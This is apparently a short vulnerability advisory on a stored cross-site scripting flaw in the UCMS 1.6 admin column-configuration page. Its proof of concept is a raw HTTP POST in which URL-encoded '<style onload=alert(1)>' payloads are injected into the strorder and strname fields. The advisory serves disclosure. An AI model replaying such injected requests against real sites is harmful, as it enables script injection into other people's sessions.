# UCMS1.6 saddpost.php cross site scripting


Vendor Homepage: http://uuu.la/

UCMS 1.6 installation package： http://uuu.la/uploadfile/file/ucms_1.6.zip

Version: V 1.6.0

Vulnerability description： UCMS 1.6 was discovered to contain a cross-site scripting (XSS) vulnerability via the "Column configuration"(栏目配置)-"Variable name module"(变量名模块) under the Site Management page.

Vulnerability recurrence： The filtering of `$strorder` is not strict in the adding method of the file `\ucms_1.6\ucms\sadmin\saddpost`

![](https://tale-1259367723.cos.ap-beijing.myqcloud.com/2023/04/25/16824049759099.jpg)
```
POST /ucms_1.6/ucms/index.php?do=sadmin_saddpost HTTP/1.1
Host: 10.211.55.7
Proxy-Connection: keep-alive
Content-Length: 531
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.211.55.7
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.211.55.7/ucms_1.6/ucms/index.php?do=install
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_5a298d=admin; psw_5a298d=11588e274d6c1b23f3997fb435480270; token_5a298d=842df413; PHPSESSID=o3ppmlrbn6epa7v9otb6qlp0b5

strcid=0&uuu_token=842df413&strname%5B%5D=%E7%AB%99%E7%82%B9%E6%A0%87%E9%A2%98&inputkind%5B%5D=1&strorder%5B%5D=5&strname%5B%5D=%E5%85%B3%E9%94%AE%E8%AF%8D&inputkind%5B%5D=1&strorder%5B%5D=%E6%8F%8F%E8%BF%B0%3Cstyle+onload%3Dalert%281%29%3E &strname%5B%5D=%E6%8F%8F%E8%BF%B0%3Cstyle+onload%3Dalert%281%29%3E&inputkind%5B%5D=2&strorder%5B%5D=15&strname%5B%5D=logo%E5%9B%BE%E7%89%87&inputkind%5B%5D=5&strorder%5B%5D=20&strname%5B%5D=%E5%A4%87%E6%A1%88%E5%8F%B7&inputkind%5B%5D=1&strorder%5B%5D=25&strname%5B%5D=%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81&inputkind%5B%5D=2&strorder%5B%5D=30
```
![](https://tale-1259367723.cos.ap-beijing.myqcloud.com/2023/04/25/16824050267261.jpg)




